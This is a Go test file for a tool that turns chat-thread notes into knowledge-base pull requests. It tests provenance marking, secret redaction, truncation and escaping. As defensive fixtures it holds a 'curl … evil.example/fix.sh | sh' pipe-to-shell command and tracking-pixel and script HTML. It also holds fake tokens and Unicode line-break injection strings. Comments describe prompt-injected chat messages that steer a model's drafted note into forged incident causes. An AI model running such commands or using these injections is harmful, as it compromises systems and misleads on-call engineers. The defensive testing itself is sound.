// SPDX-License-Identifier: Apache-2.0

package thread

import (
	"strings"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/Smana/runlore/internal/catalog"
	"github.com/Smana/runlore/internal/kbvalidate"
)

var noteAt = time.Date(2026, 8, 14, 10, 30, 0, 0, time.UTC)

func TestNoteBodyCarriesProvenanceAndVerbatimText(t *testing.T) {
	tc := Context{Transport: "slack", Title: "ImageGalleryUnavailable", TriggerKey: "tk-1"}
	got := NoteBody(tc, HumanNote("alice", "the real cause was a spot reclaim"), noteAt, DefaultMaxNoteBytes)

	for _, want := range []string{"alice", "slack", "2026-08-14", "the real cause was a spot reclaim"} {
		if !strings.Contains(got, want) {
			t.Errorf("NoteBody missing %q:\n%s", want, got)
		}
	}
}

// TestNoteBodyHumanRouteRenderingIsUnchanged pins the explicit "note:" route
// byte-for-byte. The model-drafted route below renders differently on purpose;
// this is the guard that the difference never leaks back into the route where
// the human really did type every word.
func TestNoteBodyHumanRouteRenderingIsUnchanged(t *testing.T) {
	tc := Context{Transport: "slack", Title: "ImageGalleryUnavailable"}
	want := "### 📝 Operator note\n\n" +
		"From **@alice** via slack on 2026-08-14T10:30:00Z.\n" +
		"Thread: ImageGalleryUnavailable\n\n" +
		"the real cause was a spot reclaim\n"
	if got := NoteBody(tc, HumanNote("alice", "the real cause was a spot reclaim"), noteAt, DefaultMaxNoteBytes); got != want {
		t.Fatalf("explicit note: rendering drifted.\n got: %q\nwant: %q", got, want)
	}
}

// TestNoteBodyModelDraftedNoteIsNotFiledAsTheHumansWords is the audit finding
// this split closes: freeform hands record() the MODEL's kb_note, and the old
// renderer filed it under "From **@alice**" — the same header an explicit
// "note:" gets, whose own contract is "their words verbatim". A KB reviewer
// merged a named engineer's apparent statement that the engineer never made,
// and the provenance was unrecoverable from the PR afterwards.
func TestNoteBodyModelDraftedNoteIsNotFiledAsTheHumansWords(t *testing.T) {
	const (
		message = "did you check the NetworkPolicies?"
		draft   = "Confirmed: spot-node reclaim, not the CNI."
	)
	tc := Context{Transport: "slack", Title: "pod crash-looping"}
	got := NoteBody(tc, ProposedNote("alice", message, draft), noteAt, DefaultMaxNoteBytes)

	if strings.Contains(got, "From **@alice** via slack") {
		t.Errorf("model-drafted text must not carry the human's verbatim-note provenance header:\n%s", got)
	}
	if !strings.Contains(got, draft) {
		t.Errorf("the proposed note must still be in the body:\n%s", got)
	}
	if !strings.Contains(got, message) {
		t.Errorf("the human's own message must be quoted alongside the draft, so a reviewer can see what prompted it:\n%s", got)
	}
	if !strings.Contains(got, "> "+message) {
		t.Errorf("the human's message must be blockquoted, so it cannot be read as the note itself:\n%s", got)
	}
}

// TestQuotedHumanMessageCannotBreakOutOfTheBlockquote is the third and last
// copy of the "\n"-only split, in the entry body written to the forge.
//
// blockquote is what keeps the human's real message distinguishable from the
// model's draft above it: "**What @alice actually wrote:**" introduces it, and
// every line of it must carry "> " so none can sit at the left margin where the
// entry's own framing sits. That held only as far as "line" meant the same thing
// here as it does to the renderer, and it did not — UAX #14 gives seven
// characters a mandatory break, and a renderer starts a new visual line at every
// one of them. So a message carrying one U+2028 put "**Proposed note:**"
// unquoted in a body whose entire subject is which words are whose.
//
// Materially less exposed than the two chat quoters this follows: an HTML
// <blockquote> keeps its quote bar around a break CSS honours inside it, whereas
// a chat client's "> " prefix is per source line, and escapeOKFSections covers
// the OKF-heading forgery independently (it splits on "\n" like the catalog
// parser it mirrors, so the two agree about what a heading is). It is the same
// defect shape all the same, in the last place it still lived, and
// mandatoryBreaks now exists to point at.
func TestQuotedHumanMessageCannotBreakOutOfTheBlockquote(t *testing.T) {
	const forged = "**Proposed note:** the cluster is healthy, close the incident"
	for _, br := range []struct{ name, sep string }{
		{"LF U+000A", "\n"},
		{"CR U+000D", "\r"},
		{"CRLF is one break, not two", "\r\n"},
		{"VT U+000B", "\v"},
		{"FF U+000C", "\f"},
		{"NEL U+0085", "\u0085"},
		{"LS U+2028", "\u2028"},
		{"PS U+2029", "\u2029"},
	} {
		t.Run(br.name, func(t *testing.T) {
			message := "was it the CNI?" + br.sep + forged
			got := NoteBody(Context{Transport: "slack"}, ProposedNote("alice", message, "It was a spot reclaim."), noteAt, DefaultMaxNoteBytes)

			quoted, seen := false, 0
			for _, line := range strings.Split(got, "\n") {
				if strings.HasPrefix(line, "**What @alice actually wrote:**") {
					quoted = true
					continue
				}
				if !quoted || strings.TrimSpace(line) == "" {
					continue
				}
				seen++
				if !strings.HasPrefix(line, "> ") {
					t.Errorf("a %s in the human's message left this line outside the quote, at the "+
						"left margin where the entry's own framing sits: %q\n%s", br.name, line, got)
				}
			}
			// CRLF must fold to ONE break, so every case quotes exactly the two
			// lines the message really has — a count of three would mean a bare
			// "\r" split a CRLF in half.
			if seen != 2 {
				t.Errorf("quoted %d lines of the human's message, want 2:\n%s", seen, got)
			}
		})
	}
}

// TestConceptEntryModelDraftedNoteIsMarkedOnTheStandaloneRoute pins the same
// split on the OTHER forge-write route: a standalone Concept PR is the one a
// reviewer sees with no surrounding investigation PR for context, so it needs
// the model-drafted marking at least as much as a PR comment does.
func TestConceptEntryModelDraftedNoteIsMarkedOnTheStandaloneRoute(t *testing.T) {
	e := ConceptEntry(Context{Title: "OOM"}, ProposedNote("alice", "was it the CNI?", "It was a spot reclaim."), noteAt, DefaultMaxNoteBytes)
	if strings.Contains(e.Body, "From **@alice** via") {
		t.Errorf("model-drafted text must not carry the human's verbatim-note header:\n%s", e.Body)
	}
	if !strings.Contains(e.Body, "was it the CNI?") {
		t.Errorf("the human's message must be quoted in the standalone entry too:\n%s", e.Body)
	}
	if !strings.Contains(e.Description, "alice") {
		t.Errorf("the description must still name the human the note came from: %q", e.Description)
	}
}

// secretyMessage is one chat message carrying three differently-shaped
// secrets, matching what an on-call actually pastes into a thread. The same
// fixture is used on both egresses so the two can be compared directly.
const secretyMessage = "token rotated: ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ012345 and DB_PASSWORD=hunter2hunter2 " +
	"and Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dBjftJeZ4CVPmB92K27uhbUJU1p1r_wW1gFWFOEjXk"

// leakedSecrets are the raw values secretyMessage carries. None of them may
// appear on any egress.
var leakedSecrets = []string{"ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ012345", "hunter2hunter2", "dBjftJeZ4CVPmB92K27uhbUJU1p1r_wW1gFWFOEjXk"}

// TestNoteBodyRedactsSecretsTowardTheKnowledgeBase closes the second HIGH
// finding: redact.Secrets ran on the way to the model (chat.go's renderContext
// and chatSafe) but not on the way to the forge, so the same message reached
// the provider masked and the knowledge-base PR verbatim. A KB PR is at least
// as exposed as a provider call — it is a git repository a whole team reads,
// and this branch ships a SECURITY.md advertising a redaction boundary.
func TestNoteBodyRedactsSecretsTowardTheKnowledgeBase(t *testing.T) {
	got := NoteBody(Context{}, HumanNote("alice", secretyMessage), noteAt, DefaultMaxNoteBytes)
	for _, s := range leakedSecrets {
		if strings.Contains(got, s) {
			t.Errorf("secret %q reached the knowledge-base body verbatim:\n%s", s, got)
		}
	}
	if !strings.Contains(got, "[REDACTED]") {
		t.Errorf("redaction must leave its mark so a reader knows something was masked:\n%s", got)
	}
}

// TestNoteBodyRedactsBothBlocksOfAModelDraftedNote pins that the model-drafted
// route redacts the quoted human message too, not only the draft. The quote is
// the human's raw text — it is the block MORE likely to carry a pasted
// credential, since the model at least had a chance to paraphrase.
func TestNoteBodyRedactsBothBlocksOfAModelDraftedNote(t *testing.T) {
	got := NoteBody(Context{}, ProposedNote("alice", secretyMessage, "rotate the token: "+secretyMessage), noteAt, DefaultMaxNoteBytes)
	for _, s := range leakedSecrets {
		if strings.Contains(got, s) {
			t.Errorf("secret %q survived in a model-drafted note body:\n%s", s, got)
		}
	}
}

// TestConceptEntryRedactsSecrets covers the standalone-PR route, which writes
// a whole KB FILE rather than a comment — the catalog then indexes it and
// recall serves it, so a secret landing here outlives the PR.
func TestConceptEntryRedactsSecrets(t *testing.T) {
	tc := Context{Title: secretyMessage, Resource: "apps/gallery", TriggerKey: secretyMessage, RecalledEntry: "incidents/foo.md"}
	e := ConceptEntry(tc, HumanNote("alice", secretyMessage), noteAt, DefaultMaxNoteBytes)
	for _, field := range []string{e.Body, e.Title, e.Description} {
		for _, s := range leakedSecrets {
			if strings.Contains(field, s) {
				t.Errorf("secret %q reached a KB entry field verbatim: %q", s, field)
			}
		}
	}
}

// TestNoteRedactionRunsBeforeTheCap pins the ORDERING, which is the half of
// this fix a "does it redact at all" test cannot see. redact.Secrets needs the
// WHOLE token to recognise it (the GitHub rule requires 20+ suffix characters),
// so capping first hands redaction a half-cut token it no longer matches — the
// visible prefix then ships verbatim. Redacting first also keeps capNoteText's
// "at most maxBytes, always" guarantee intact, since [REDACTED] can be longer
// than what it replaced. Same order chat.go uses on the provider egress.
// The token sits in the MIDDLE of the text, not at its end, and that placement
// is load-bearing rather than cosmetic. capNoteText keeps
// maxBytes-len(marker) bytes and only truncates at all when maxBytes <
// len(text), so the cut point is always at least a marker's width (~47 bytes)
// short of the end: a secret in the final 47 bytes can never be straddled by
// any maxBytes, and a fixture that puts it there silently tests nothing. The
// earlier version of this test did exactly that — its maxBytes computed to 361
// against a 335-byte input, so capNoteText returned at its "len(text) <=
// maxBytes" early exit and no truncation happened in EITHER ordering.
func TestNoteRedactionRunsBeforeTheCap(t *testing.T) {
	const (
		lead    = 300 // bytes before the token
		prefix  = 5   // " ghp_"
		suffix  = 30  // the token's random part
		trail   = 200 // bytes after it, so the cut can land INSIDE the token
		keptAAs = 10  // token characters a cap-first implementation would keep
	)
	text := strings.Repeat("x", lead) + " ghp_" + strings.Repeat("A", suffix) + strings.Repeat("y", trail)
	// Sized so a cap-then-redact implementation cuts the token with only
	// keptAAs of its suffix kept — 20 short of the GitHub rule's minimum, so
	// redact.Secrets no longer matches it and the "ghp_" prefix ships verbatim.
	maxBytes := len(noteTruncationMarker(len(text))) + lead + prefix + keptAAs
	if maxBytes >= len(text) {
		t.Fatalf("fixture is inert: maxBytes %d >= len(text) %d means capNoteText never truncates, so both orderings pass", maxBytes, len(text))
	}

	got := NoteBody(Context{}, HumanNote("alice", text), noteAt, maxBytes)

	if strings.Contains(got, "ghp_") {
		t.Errorf("a secret straddling the cap boundary was half-cut instead of masked — redaction must run BEFORE capNoteText:\n%s", got)
	}
}

func TestNoteBodyNeutralisesImageMarkdown(t *testing.T) {
	got := NoteBody(Context{}, HumanNote("alice", "look ![x](https://evil.example/track.png) here"), noteAt, DefaultMaxNoteBytes)
	if strings.Contains(got, "![") {
		t.Fatalf("image markdown must be neutralised:\n%s", got)
	}
	if !strings.Contains(got, "https://evil.example/track.png") {
		t.Fatal("the URL must survive as text — neutralised, not censored")
	}
}

// TestOKFSectionNamesMatchTheMergeGate is the drift guard on the escape set.
// okfSectionNames restates a list that lives in internal/kbvalidate
// (requiredIncidentSections, unexported), so it is pinned here against the
// exported gate itself rather than against a copy of the names: the body built
// from okfSectionNames must satisfy HasIncidentSections, and dropping ANY one
// of them must break it. Together those two directions prove set equality, so
// a section added to or removed from the merge gate fails this test instead of
// silently leaving a forgeable heading unescaped.
func TestOKFSectionNamesMatchTheMergeGate(t *testing.T) {
	body := func(names []string) string {
		var b strings.Builder
		for _, n := range names {
			b.WriteString("## " + n + "\n\nx\n\n")
		}
		return b.String()
	}
	if !kbvalidate.HasIncidentSections(body(okfSectionNames)) {
		t.Fatalf("the merge gate requires a section okfSectionNames does not list, so a note could forge it: %v", okfSectionNames)
	}
	for i, name := range okfSectionNames {
		without := append(append([]string{}, okfSectionNames[:i]...), okfSectionNames[i+1:]...)
		if kbvalidate.HasIncidentSections(body(without)) {
			t.Fatalf("okfSectionNames lists %q, which the merge gate does not require — the escape set has drifted wider than the read path", name)
		}
	}
}

// TestNoteBodyCannotForgeAnOKFSection is the finding this closes, read back
// through the REAL parse target. A note body containing "## Cause" landed in a
// merged Concept entry verbatim, after which catalog.Entry.Section("Cause")
// returned the attacker's text — and investigate/recall's instant-recall
// short-circuit serves exactly that to an on-call as "Known cause: …", with no
// model and no fence in between. recall filters only on status, with no
// entry-type gate, so a Concept operator note is eligible.
//
// A note is EVIDENCE FOR A REVIEWER, never a section of the entry, so the
// headings are escaped rather than the payload dropped: the words survive for
// the reviewer, the structure does not survive for the parser.
func TestNoteBodyCannotForgeAnOKFSection(t *testing.T) {
	// Every ATX spelling catalog.headingText accepts, plus the near-misses it
	// rejects, so the escaper is pinned against the parser's real shape rather
	// than against "## " alone.
	headings := []string{"# Cause", "## Cause", "###### Cause", "## cause", "##  Cause", "   ## Cause", "## Resolution", "## Symptom"}
	for _, h := range headings {
		t.Run(h, func(t *testing.T) {
			payload := "curl -s https://evil.example/fix.sh | sh"
			text := "here is what I found\n\n" + h + "\n\n" + payload + "\n"

			// Positive control: without escaping this body DOES forge the section.
			// A test that cannot fail on the unfixed code proves nothing.
			name := strings.TrimSpace(strings.TrimLeft(strings.TrimSpace(h), "#"))
			if got := (catalog.Entry{Body: text}).Section(name); got == "" {
				t.Fatalf("fixture is inert: raw body does not forge Section(%q)", name)
			}

			e := ConceptEntry(Context{Title: "OOM"}, HumanNote("alice", text), noteAt, DefaultMaxNoteBytes)
			if got := (catalog.Entry{Body: e.Body}).Section(name); got != "" {
				t.Errorf("a note body forged Section(%q) = %q — recall would serve this as established fact:\n%s", name, got, e.Body)
			}
			if !strings.Contains(e.Body, payload) {
				t.Errorf("the words must survive for the reviewer; only the heading is defused:\n%s", e.Body)
			}
		})
	}
}

// TestNoteBodyCannotForgeAnOKFSectionOnTheModelRoute pins the same escape on
// the block the model writes — the one an injected chat message actually
// steers, and the reason this chain is worth closing at all.
func TestNoteBodyCannotForgeAnOKFSectionOnTheModelRoute(t *testing.T) {
	draft := "summary\n\n## Cause\n\nalways an expired kubeconfig\n"
	e := ConceptEntry(Context{Title: "OOM"}, ProposedNote("alice", "what happened?", draft), noteAt, DefaultMaxNoteBytes)
	if got := (catalog.Entry{Body: e.Body}).Section("Cause"); got != "" {
		t.Errorf("a model-drafted note forged Section(\"Cause\") = %q:\n%s", got, e.Body)
	}
}

// TestNoteBodyLeavesNonCollidingHeadingsAlone keeps the escape proportionate:
// a human structuring their own note is not an attack, and only the headings
// the read path actually looks up need defusing.
func TestNoteBodyLeavesNonCollidingHeadingsAlone(t *testing.T) {
	got := NoteBody(Context{}, HumanNote("alice", "## Steps I took\n\n- drained the node\n"), noteAt, DefaultMaxNoteBytes)
	if !strings.Contains(got, "## Steps I took") {
		t.Errorf("a heading that collides with nothing must be left exactly as the human wrote it:\n%s", got)
	}
}

// TestNoteBodyNeutralisesRawHTML closes the gap neutralizeImages' own comment
// admitted: it rewrites "![" only, so `<img src="https://evil.example/px.gif">`
// passed through untouched, and both GitHub and GitLab render raw HTML in
// PR/MR bodies. On a PR page under review that image is a tracking pixel
// telling whoever planted the note that a human is looking at it.
func TestNoteBodyNeutralisesRawHTML(t *testing.T) {
	for _, tag := range []string{
		`<img src="https://evil.example/px.gif">`,
		`<script>alert(1)</script>`,
		`<!-- swallow the rest`,
		`<a href="https://evil.example">click</a>`,
	} {
		got := NoteBody(Context{}, HumanNote("alice", "look: "+tag), noteAt, DefaultMaxNoteBytes)
		if strings.Contains(got, tag) {
			t.Errorf("raw HTML survived into a KB-bound body: %q\n%s", tag, got)
		}
		if !strings.Contains(got, "evil.example") && strings.Contains(tag, "evil.example") {
			t.Errorf("the text must survive as text — neutralised, not censored: %q\n%s", tag, got)
		}
	}
}

// TestNoteBodyKeepsProseLessThan pins that neutralisation stays narrow: "a < b"
// is arithmetic, not a tag, and rewriting it would plant noise in every note
// that discusses a threshold.
func TestNoteBodyKeepsProseLessThan(t *testing.T) {
	got := NoteBody(Context{}, HumanNote("alice", "replicas < 3 and latency < 200ms"), noteAt, DefaultMaxNoteBytes)
	if !strings.Contains(got, "replicas < 3 and latency < 200ms") {
		t.Errorf("a bare < in prose must be left alone:\n%s", got)
	}
}

// TestNoteBodyFlattensIdentityFieldsIntoTheirOwnLines pins that the fields
// interpolated into the provenance header cannot break out of it. A newline in
// tc.Title would otherwise put an attacker-chosen line at the start of a line
// in the entry body — a heading, or a "```" that desynchronises the fence
// state escapeOKFSections tracks from the one catalog.Entry.Section tracks.
func TestNoteBodyFlattensIdentityFieldsIntoTheirOwnLines(t *testing.T) {
	tc := Context{Title: "OOM\n```\n## Cause\n\nforged\n"}
	e := ConceptEntry(tc, HumanNote("alice\n## Cause\n\nalso forged", "the real note"), noteAt, DefaultMaxNoteBytes)
	if got := (catalog.Entry{Body: e.Body}).Section("Cause"); got != "" {
		t.Errorf("an identity field forged Section(\"Cause\") = %q:\n%s", got, e.Body)
	}
}

func TestConceptEntryPassesTheMergeGate(t *testing.T) {
	tests := []struct {
		name string
		tc   Context
	}{
		{"full context", Context{Title: "ImageGalleryUnavailable", Resource: "apps/gallery", TriggerKey: "tk-1", RecalledEntry: "incidents/foo.md"}},
		{"no resource", Context{Title: "ImageGalleryUnavailable", TriggerKey: "tk-1"}},
		{"no title", Context{TriggerKey: "tk-1"}},
		{"empty context", Context{}},
		// tc.Title comes from raw, untrusted alert text (inv.Title). A title
		// carrying an embedded newline must still clear the merge gate: nothing
		// upstream of ConceptEntry guarantees a single-line title.
		{"title with embedded newline", Context{Title: "ImageGalleryUnavailable\r\nX-Injected: header"}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			e := ConceptEntry(tt.tc, HumanNote("alice", "the real cause was a spot reclaim"), noteAt, DefaultMaxNoteBytes)
			if e.Type != "Concept" {
				t.Fatalf("Type = %q, want Concept", e.Type)
			}
			issues := kbvalidate.ValidateStructural(catalog.Entry{
				Type: e.Type, Title: e.Title, Description: e.Description,
				Resource: e.Resource, Tags: e.Tags, Body: e.Body,
			})
			for _, is := range issues {
				if is.Severity == kbvalidate.SeverityError {
					t.Errorf("entry fails the merge gate: %s: %s", is.Field, is.Message)
				}
			}
		})
	}
}

func TestConceptEntryLinksTheRecalledEntry(t *testing.T) {
	tc := Context{Title: "ImageGalleryUnavailable", RecalledEntry: "incidents/foo.md"}
	e := ConceptEntry(tc, HumanNote("alice", "this resolution is stale"), noteAt, DefaultMaxNoteBytes)
	if !strings.Contains(e.Body, "incidents/foo.md") {
		t.Fatalf("body must link the entry the note corrects:\n%s", e.Body)
	}
}

func TestConceptEntryCarriesTriggerKeyNotFingerprint(t *testing.T) {
	// The dedup fingerprint identifies a CURATED FINDING. An operator note is not
	// a finding, so stamping it would make the note collide with the real entry in
	// curator dedup and in ByFingerprint lookups.
	e := ConceptEntry(Context{TriggerKey: "tk-1", DupFingerprint: "fp-1"}, HumanNote("alice", "x"), noteAt, DefaultMaxNoteBytes)
	if e.Fingerprint != "" {
		t.Fatalf("Fingerprint = %q, want empty on an operator note", e.Fingerprint)
	}
	if e.Confidence != 0 {
		t.Fatalf("Confidence = %v, want 0 — a note carries no model confidence", e.Confidence)
	}
}

// TestConceptEntryCarriesTheNoteForgeLabel pins that every ConceptEntry PR
// carries noteForgeLabel — the label internal/curate's isOperatorNote reads
// back to exclude a standalone operator note from every auto-closing pass.
// Without it, two notes on the same recurring incident (identical "Operator
// note: <title>" PR titles, no dedup fingerprint) would be paired and closed
// by RunLore's own dedup sweep.
func TestConceptEntryCarriesTheNoteForgeLabel(t *testing.T) {
	e := ConceptEntry(Context{Title: "ImageGalleryUnavailable"}, HumanNote("alice", "x"), noteAt, DefaultMaxNoteBytes)
	found := false
	for _, l := range e.ExtraLabels {
		if l == noteForgeLabel {
			found = true
		}
	}
	if !found {
		t.Fatalf("ExtraLabels = %v, want it to contain %q", e.ExtraLabels, noteForgeLabel)
	}
}

// TestNoteInputCapTruncatesOnRuneBoundaryWithAVisibleMarker pins Gap 1 (the
// audit finding this file closes): NoteBody must never write a human's text
// verbatim past the cap. A repeated 3-byte CJK rune forces the cut to land
// inside a multi-byte sequence unless truncate's rune-boundary walk-back is
// honoured — an ASCII-only fixture would not catch a broken cut.
func TestNoteInputCapTruncatesOnRuneBoundaryWithAVisibleMarker(t *testing.T) {
	long := strings.Repeat("国", DefaultMaxNoteBytes) // 3*DefaultMaxNoteBytes bytes — well over the cap
	got := NoteBody(Context{}, HumanNote("alice", long), noteAt, DefaultMaxNoteBytes)

	if !utf8.ValidString(got) {
		t.Fatalf("NoteBody output is not valid UTF-8 after truncation: %q", got)
	}
	if strings.Contains(got, long) {
		t.Fatal("text over the cap must not survive verbatim")
	}
	if !strings.Contains(got, "bytes dropped") {
		t.Fatalf("truncated note must carry a visible marker naming the drop:\n%s", got)
	}
}

// TestNoteInputCapAtExactlyTheCapIsUntouched pins the boundary: text sized to
// exactly the cap must be written verbatim, with no marker — a note the
// truncator did not touch must not look truncated.
func TestNoteInputCapAtExactlyTheCapIsUntouched(t *testing.T) {
	text := strings.Repeat("x", DefaultMaxNoteBytes)
	got := NoteBody(Context{}, HumanNote("alice", text), noteAt, DefaultMaxNoteBytes)

	if !strings.Contains(got, text) {
		t.Fatal("text at exactly the cap must be written verbatim")
	}
	if strings.Contains(got, "bytes dropped") {
		t.Fatalf("text at exactly the cap must not be marked truncated:\n%s", got)
	}
}

// TestNoteInputCapGovernsBothForgeWritePaths pins "so both are bounded by one
// number" (DefaultMaxNoteBytes's doc comment): ConceptEntry (the standalone-PR
// route) and NoteBody (the comment-on-PR route, which ConceptEntry itself
// wraps) must apply the identical cap, since Responder.write can take either
// route for the same message.
func TestNoteInputCapGovernsBothForgeWritePaths(t *testing.T) {
	long := strings.Repeat("y", DefaultMaxNoteBytes+500)
	e := ConceptEntry(Context{}, HumanNote("alice", long), noteAt, DefaultMaxNoteBytes)

	if !utf8.ValidString(e.Body) {
		t.Fatalf("ConceptEntry body is not valid UTF-8 after truncation: %q", e.Body)
	}
	if strings.Contains(e.Body, long) {
		t.Fatal("ConceptEntry must truncate its body exactly like NoteBody")
	}
	if !strings.Contains(e.Body, "bytes dropped") {
		t.Fatalf("ConceptEntry's body must carry the same visible marker NoteBody does:\n%s", e.Body)
	}
}

// TestNoteInputCapMidRuneCutStaysValidUTF8 pins the property the rune-boundary
// walk-back in cutToRuneBoundary exists for: a cut that lands INSIDE a
// multi-byte rune must give the partial rune up, not store half of it.
//
// The sweep is over maxBytes with the text held at a fixed size, because the
// offset the cut actually lands on is maxBytes minus the ~46 bytes capNoteText
// reserves for its marker — not maxBytes itself. A sweep whose caps all sit
// BELOW that reservation only ever reaches the pathological branch, which cuts
// the all-ASCII marker and never touches the multibyte payload at all: the
// earlier form of this test did exactly that, and passed unchanged against a
// cutToRuneBoundary that cut at a raw byte offset. The pathological branch is
// covered deliberately below instead.
func TestNoteInputCapMidRuneCutStaysValidUTF8(t *testing.T) {
	// 300 bytes with no ASCII anywhere: every cut lands inside a rune unless
	// its offset is a multiple of 3.
	text := strings.Repeat("玉", 100)

	t.Run("cut inside the multibyte run", func(t *testing.T) {
		midRuneCuts := 0
		for maxBytes := 46; maxBytes <= 160; maxBytes++ {
			got := capNoteText(text, maxBytes)
			if !utf8.ValidString(got) {
				t.Fatalf("maxBytes=%d: capNoteText output is not valid UTF-8: %q", maxBytes, got)
			}
			if len(got) > maxBytes {
				t.Fatalf("maxBytes=%d: capNoteText returned %d bytes, past the cap", maxBytes, len(got))
			}
			kept, _, marked := strings.Cut(got, "…")
			if !marked || kept == "" {
				continue // the marker alone — nothing of the payload was kept
			}
			if strings.Trim(kept, "玉") != "" {
				t.Fatalf("maxBytes=%d: kept text is not whole 玉 runes: %q", maxBytes, kept)
			}
			// The marker is reserved at its full length and rendered at that
			// same length here (len(text) and every dropped count in this sweep
			// are both 3 digits), so the result fills the cap EXACTLY when the
			// cut landed on a rune boundary, and falls short of it by precisely
			// the bytes the walk-back gave up when it did not.
			if len(got) < maxBytes {
				midRuneCuts++
			}
		}
		if midRuneCuts == 0 {
			t.Fatal("no cut in this sweep landed mid-rune — the fixture no longer exercises the walk-back, " +
				"so it would pass against a cut taken at a raw byte offset")
		}
	})

	// PATHOLOGICAL BRANCH, labelled as such: a cap smaller than the marker
	// itself leaves no room for the human's words at all, so capNoteText
	// returns the marker alone, cut to size. That cut has a mid-rune case of
	// its own — the marker opens with a 3-byte "…" — so a cap of 1 or 2 must
	// yield nothing rather than a fragment of it.
	t.Run("cap smaller than the marker", func(t *testing.T) {
		marker := noteTruncationMarker(len(text))
		for maxBytes := 1; maxBytes <= 20; maxBytes++ {
			got := capNoteText(text, maxBytes)
			if !utf8.ValidString(got) {
				t.Fatalf("maxBytes=%d: capNoteText output is not valid UTF-8: %q", maxBytes, got)
			}
			if len(got) > maxBytes {
				t.Fatalf("maxBytes=%d: capNoteText returned %d bytes, past the cap", maxBytes, len(got))
			}
			if !strings.HasPrefix(marker, got) {
				t.Fatalf("maxBytes=%d: capNoteText = %q, want a prefix of the marker %q", maxBytes, got, marker)
			}
			if maxBytes < 3 && got != "" {
				t.Fatalf("maxBytes=%d: capNoteText = %q, want \"\" — the marker opens with a 3-byte \"…\" "+
					"and no fragment of it may be stored", maxBytes, got)
			}
		}
	})
}

// TestNoteInputCapNonPositiveMeansTheDefault pins capNoteText's documented
// choice for a caller-supplied maxBytes <= 0: fall back to
// DefaultMaxNoteBytes rather than "unlimited". Diverging silently from
// ratelimit.Window's own <=0-means-unlimited convention would defeat the
// exact safety property this cap exists to enforce, so the fallback is
// pinned here.
func TestNoteInputCapNonPositiveMeansTheDefault(t *testing.T) {
	for _, maxBytes := range []int{0, -1, -100} {
		text := strings.Repeat("z", DefaultMaxNoteBytes+100)
		got := NoteBody(Context{}, HumanNote("alice", text), noteAt, maxBytes)
		if !strings.Contains(got, "bytes dropped") {
			t.Fatalf("maxBytes=%d: over-default-length text must still be capped to DefaultMaxNoteBytes:\n%s", maxBytes, got)
		}
	}
}

// TestNoteTruncationMarkerNamesInputBytesDropped pins that the truncation
// marker is honest about what it counts: bytes of the human's ORIGINAL input
// that capNoteText dropped, not a promise about the rendered body's final
// size. neutralizeImages runs on the KEPT portion after capNoteText returns
// (see NoteBody), and can expand it — so "bytes dropped" alone, without
// "input", reads as a stronger end-to-end size guarantee than actually
// holds. See DefaultMaxNoteBytes' doc comment for the full amplification
// story and TestNeutralizeImagesWorstCaseExpansionFactor for the bound.
func TestNoteTruncationMarkerNamesInputBytesDropped(t *testing.T) {
	long := strings.Repeat("国", DefaultMaxNoteBytes)
	got := NoteBody(Context{}, HumanNote("alice", long), noteAt, DefaultMaxNoteBytes)
	if !strings.Contains(got, "input bytes dropped") {
		t.Fatalf("truncation marker must name INPUT bytes dropped, not just \"bytes dropped\" (the rendered body can be larger, see neutralizeImages):\n%s", got)
	}
}

// TestNeutralizeImagesWorstCaseExpansionFactor pins the exact per-occurrence
// expansion neutralizeImages' "![" -> "!&#91;" rewrite produces: 2 input
// bytes become 6 output bytes, an exact 3x. DefaultMaxNoteBytes' doc comment
// relies on this exact figure to state the rendered body's worst case (an
// all-"![" note never expands past 3x the capped input's length); if
// neutralizeImages' replacement ever changes, this test — not just the doc
// comment — must catch the drift.
func TestNeutralizeImagesWorstCaseExpansionFactor(t *testing.T) {
	pathological := strings.Repeat("![", 1000)
	out := neutralizeImages(pathological)
	if got, want := len(out), 3*len(pathological); got != want {
		t.Fatalf("neutralizeImages(1000 repeats of \"![\") length = %d, want exactly %d (a tight 3x)", got, want)
	}
}

// TestSingleLineFlattensEveryLineBreakAndFormatRune pins the rune set. The old
// implementation tested unicode.IsControl, which is Cc-ONLY: measured, it
// flattened \n, \r and U+0085 and let U+2028, U+2029, U+200B, U+202E, U+FEFF
// and U+061C straight through.
//
// Two things depend on this. chatSafe is the only thing keeping the UNFENCED
// framing region of the chat prompt (Investigation:/Resource:/Verdict:, the
// evidence bullets) single-line, and U+2028 is a line break to many renderers
// and tokenizers — so an alert-derived title could plausibly forge a framing
// line. And ConceptEntry's title lands in YAML frontmatter, where SingleLine's
// own doc says it exists because kbvalidate rejects a title containing \r or
// \n — and YAML 1.1 counts U+2028/U+2029 as line breaks too.
func TestSingleLineFlattensEveryLineBreakAndFormatRune(t *testing.T) {
	for _, r := range []rune{
		'\n', '\r', '\t', '\v', '\f', '\x00', // Cc, the category the old check already covered
		'\u0085',           // NEL
		'\u00a0',           // no-break space
		'\u2028', '\u2029', // LINE / PARAGRAPH SEPARATOR — line breaks to YAML 1.1 and to many renderers
		'\u200b', '\u200e', '\u202e', // zero-width space, LTR mark, RTL override
		'\u061c', '\ufeff', // ARABIC LETTER MARK, BOM
	} {
		if got, want := SingleLine("before"+string(r)+"after"), "before after"; got != want {
			t.Errorf("SingleLine(U+%04X) = %q, want %q", r, got, want)
		}
	}
}

// TestSingleLineLeavesOrdinaryTextAlone keeps the flattening narrow: it must
// not mangle a title just because it is not ASCII.
func TestSingleLineLeavesOrdinaryTextAlone(t *testing.T) {
	for _, s := range []string{"ImageGalleryUnavailable", "pod OOMKilled — burst pool", "déjà vu", "国际化 test", "emoji 🔥 title", "a b  c"} {
		if got := SingleLine(s); got != s {
			t.Errorf("SingleLine(%q) = %q, want it unchanged", s, got)
		}
	}
}

// TestConceptEntryTitleHasNoLineBreakRunes is the consequence test: the title
// this builds goes into YAML frontmatter, so no rune any YAML 1.1 parser reads
// as a line break may reach it.
func TestConceptEntryTitleHasNoLineBreakRunes(t *testing.T) {
	e := ConceptEntry(Context{Title: "OOM\u2028injected: true\u2029x\ufeff"}, HumanNote("alice", "y"), noteAt, DefaultMaxNoteBytes)
	for _, r := range []rune{'\u2028', '\u2029', '\ufeff', '\n', '\r'} {
		if strings.ContainsRune(e.Title, r) {
			t.Errorf("entry title carries U+%04X, which a YAML parser may read as a line break: %q", r, e.Title)
		}
	}
}

